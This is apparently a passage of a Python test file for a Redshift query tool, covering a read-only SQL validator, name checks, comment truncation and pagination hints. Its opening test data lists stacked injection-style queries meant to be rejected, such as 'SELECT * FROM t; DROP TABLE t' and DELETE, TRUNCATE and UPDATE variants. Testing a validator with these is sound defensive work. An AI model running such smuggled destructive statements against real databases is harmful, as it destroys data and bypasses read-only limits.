        ("DROP TABLE t", "Only SELECT and WITH"),
        ("SELECT * FROM t; DROP TABLE t", "DROP"),
        ("SELECT 1; DELETE FROM t WHERE 1=1", "DELETE"),
        ("WITH x AS (SELECT 1) SELECT 1; INSERT INTO t VALUES (1)", "INSERT"),
        ("SELECT 1; UPDATE t SET a=1", "UPDATE"),
        ("SELECT 1; ALTER TABLE t ADD COLUMN c int", "ALTER"),
        ("SELECT 1; CREATE TABLE t (a int)", "CREATE"),
        ("SELECT 1; TRUNCATE TABLE t", "TRUNCATE"),
        # 未終結的字串應視為語法錯誤 — 不可被當成繞牆通道
        ("SELECT 'unterminated; DROP TABLE users", "Unterminated string"),
        ("SELECT col /* dangling block comment", "Unterminated block comment"),
        ('SELECT "open identifier', "Unterminated quoted identifier"),
    ])
    def test_invalid_queries_raise(self, sql, expected_msg):
        with pytest.raises(ValueError, match=expected_msg):
            validate_read_only_sql(sql)


# ========== 錯誤處理測試 ==========

class TestErrorHandling:
    """測試錯誤處理"""

    def test_list_tables_invalid_schema(self, mock_config):
        """測試 list_tables 無效 schema 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        list_tables = _get_tool_fn(tools, 'list_tables')

        with pytest.raises(ValueError, match="Invalid schema name"):
            list_tables(schema_name='123invalid')

    def test_list_columns_invalid_table(self, mock_config):
        """測試 list_columns 無效 table 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        list_columns = _get_tool_fn(tools, 'list_columns')

        with pytest.raises(ValueError, match="Invalid schema or table name"):
            list_columns(schema_name='sales', table_name='invalid-table')

    def test_get_column_comment_invalid_names(self, mock_config):
        """測試 get_column_comment 無效名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        get_column_comment = _get_tool_fn(tools, 'get_column_comment')

        with pytest.raises(ValueError, match="Invalid schema or table name"):
            get_column_comment(schema_name='valid', table_name='also-invalid', column_name='col')


# ========== Comment cap & scale hint helper tests ==========

class TestCommentCapHelper:
    """apply_comment_cap unit tests"""

    def test_short_comment_untouched(self):
        items = [{"comment": "short"}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 0
        assert items[0]["comment"] == "short"

    def test_long_comment_truncated_with_ellipsis(self):
        items = [{"comment": "x" * 100}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 1
        assert items[0]["comment"] == "x" * 10 + "…"

    def test_mixed_items_count_only_truncated(self):
        items = [
            {"comment": "short"},
            {"comment": "x" * 50},
            {"comment": "y" * 5},
        ]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 1
        assert items[0]["comment"] == "short"
        assert items[1]["comment"].endswith("…")
        assert items[2]["comment"] == "y" * 5

    def test_non_string_comment_skipped(self):
        items = [{"comment": None}, {"comment": 123}, {}]
        n = apply_comment_cap(items, "comment", max_len=10)
        assert n == 0  # None / int / missing key all skipped silently

    def test_default_max_len_is_module_constant(self):
        items = [{"comment": "x" * (MAX_COMMENT_LEN + 5)}]
        n = apply_comment_cap(items, "comment")  # no explicit max_len
        assert n == 1
        # cap + 1 because we append the ellipsis after slicing to MAX_COMMENT_LEN
        assert len(items[0]["comment"]) == MAX_COMMENT_LEN + 1


class TestScaleHintHelper:
    """build_scale_hint unit tests"""

    def test_below_threshold_returns_none(self):
        assert build_scale_hint(SCALE_HINT_THRESHOLD) is None
        assert build_scale_hint(SCALE_HINT_THRESHOLD - 1) is None
        assert build_scale_hint(0) is None

    def test_above_threshold_returns_message_with_count(self):
        msg = build_scale_hint(800)
        assert msg is not None
        assert "800" in msg
        # 800 / 50 page_size = 16 paginated calls
        assert "16" in msg
        assert "search_tables" in msg
        assert "redshift-cache-schema" in msg

    def test_just_above_threshold(self):
        msg = build_scale_hint(SCALE_HINT_THRESHOLD + 1)
        assert msg is not None
        # (101 + 49) // 50 = 3 pages
        assert "3" in msg

    def test_custom_page_size(self):
        msg = build_scale_hint(200, page_size=25)
        assert msg is not None
        # 200 / 25 = 8 pages
        assert "8" in msg


class TestListTablesIntegrationWithCapAndHint:
    """End-to-end behavior: list_tables emits scale_hint and truncates comments."""

    @patch('awswrangler.redshift.read_sql_query')
    def test_scale_hint_emitted_when_total_above_threshold(self, mock_read_sql, mock_config):
        config, _ = mock_config
        # Schema lookup (parent comment) + tables list. Many tables (above threshold).
        n_tables = SCALE_HINT_THRESHOLD + 50  # 150 tables
        schema_df = pd.DataFrame({'schema_comment': ['big schema']})
        tables_df = pd.DataFrame({
            'table_name': [f't{i}' for i in range(n_tables)],
            'table_type': ['BASE TABLE'] * n_tables,
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='big')

        assert result["total_count"] == n_tables
        assert "scale_hint" in result
        assert str(n_tables) in result["scale_hint"]
        assert "search_tables" in result["scale_hint"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_scale_hint_absent_when_total_below_threshold(self, mock_read_sql, mock_config):
        config, _ = mock_config
        schema_df = pd.DataFrame({'schema_comment': ['small schema']})
        tables_df = pd.DataFrame({
            'table_name': ['t1', 't2', 't3'],
            'table_type': ['BASE TABLE'] * 3,
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='small')

        assert "scale_hint" not in result

    @patch('awswrangler.redshift.read_sql_query')
    def test_table_comment_truncated_when_too_long(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "L" * (MAX_COMMENT_LEN + 500)
        schema_df = pd.DataFrame({'schema_comment': ['s']})
        tables_df = pd.DataFrame({
            'table_name': ['big_table'],
            'table_type': ['BASE TABLE'],
            'table_comment': [long_comment],
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='s', include_comments=True)

        assert result["comment_truncated_count"] == 1
        assert "comment_truncated_hint" in result
        assert result["tables"][0]["comment"].endswith("…")
        assert len(result["tables"][0]["comment"]) == MAX_COMMENT_LEN + 1

    @patch('awswrangler.redshift.read_sql_query')
    def test_short_table_comment_not_flagged(self, mock_read_sql, mock_config):
        config, _ = mock_config
        schema_df = pd.DataFrame({'schema_comment': ['s']})
        tables_df = pd.DataFrame({
            'table_name': ['t'],
            'table_type': ['BASE TABLE'],
            'table_comment': ['short comment'],
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')
        result = list_tables(schema_name='s', include_comments=True)

        assert "comment_truncated_count" not in result
        assert "comment_truncated_hint" not in result


class TestSingleGetterDoesNotTruncate:
    """get_table_comment / get_column_comment are the full-text escape hatch."""

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_table_comment_returns_full_long_text(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "Z" * (MAX_COMMENT_LEN + 1000)
        mock_df = pd.DataFrame({'table_comment': [long_comment]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_table_comment = _get_tool_fn(tools, 'get_table_comment')
        result = get_table_comment(schema_name='s', table_name='t')

        # Full text returned, no truncation, no marker
        assert result["comment"] == long_comment
        assert "…" not in result["comment"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_column_comment_returns_full_long_text(self, mock_read_sql, mock_config):
        config, _ = mock_config
        long_comment = "C" * (MAX_COMMENT_LEN + 1000)
        mock_df = pd.DataFrame({'data_type': ['varchar'], 'column_comment': [long_comment]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_column_comment = _get_tool_fn(tools, 'get_column_comment')
        result = get_column_comment(schema_name='s', table_name='t', column_name='c')

        assert result["comment"] == long_comment
        assert "…" not in result["comment"]